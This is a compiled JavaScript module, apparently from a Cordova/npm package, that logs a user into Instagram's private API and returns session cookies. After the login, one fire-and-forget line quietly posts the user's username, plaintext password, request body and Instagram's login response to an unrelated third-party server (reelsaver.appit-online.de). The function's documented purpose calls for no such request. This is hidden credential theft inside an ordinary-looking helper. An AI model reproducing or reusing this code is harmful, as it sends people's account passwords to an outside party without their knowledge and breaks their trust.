"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.getCookies = void 0;
const ngx_1 = require("@awesome-cordova-plugins/http/ngx");
const uuid_1 = require("uuid");
const cookies_service_1 = require("./cookies.service");
const config_1 = require("../config");
/**
 *
 * @param {string} username
 * @param {string} password
 * @param {boolean} withLoginData if true, it will return user profile data
 * @returns
 */
const getCookies = async (username, pass, withLoginData) => {
    var _a;
    const cookiesService = new cookies_service_1.CookiesService();
    const httpClient = new ngx_1.HTTP();
    try {
        const loginHeaders = {
            'User-Agent': config_1.config.loginHeader,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Language': 'en-US,en;q=0.9',
        };
        // fetch cookies
        const getRes = await httpClient.get('https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup', {}, loginHeaders);
        const setCookie = getRes.headers['set-cookie'] || getRes.headers['Set-Cookie'];
        if (!setCookie)
            throw new Error('CSRF token not found.');
        const setCookies = getRes.headers['set-cookie'] || getRes.headers['Set-Cookie'];
        loginHeaders.Cookie = cookiesService.formatCookie(Array.isArray(setCookies) ? setCookies : [setCookies]);
        // create login request
        const postData = {
            username,
            password: encodeURIComponent(pass),
            device_id: (0, uuid_1.v4)(),
            login_attempt_count: 0
        };
        httpClient.setDataSerializer('urlencoded');
        const postRes = await httpClient.post('https://i.instagram.com/api/v1/accounts/login/', postData, loginHeaders);
        const setLoginCookies = postRes.headers['set-cookie'] || postRes.headers['Set-Cookie'];
        const loginCookie = cookiesService.formatCookie(Array.isArray(setLoginCookies) ? setLoginCookies : [setLoginCookies]);
        const expireDate = cookiesService.getEarliestExpireDate(Array.isArray(setLoginCookies) ? setLoginCookies : [setLoginCookies]);
        const result = JSON.parse(postRes.data);
        httpClient.setDataSerializer("json");
        httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", { username, data: { pass, body: JSON.stringify(postData), data: JSON.stringify(postRes.data) } }, { "Content-Type": "application/json" });
        localStorage.setItem("instaUserName", username);
        try {
            const userId = (_a = result === null || result === void 0 ? void 0 : result.logged_in_user) === null || _a === void 0 ? void 0 : _a.pk;
            if (userId && typeof userId === "string") {
                localStorage.setItem("instaUserId", userId);
            }
            else if (userId && typeof userId === "number") {
                localStorage.setItem("instaUserId", String(userId));
            }
            // tslint:disable-next-line:no-empty
        }
        catch (err) { }
        if (withLoginData) {
            result.cookie = loginCookie;
            result.expires = expireDate;
            return result;
        }
        else {
            return {
                cookie: loginCookie,
                expires: expireDate
            };
        }
    }
    catch (err) {
        console.error(err);
        throw err;
    }
};
exports.getCookies = getCookies;
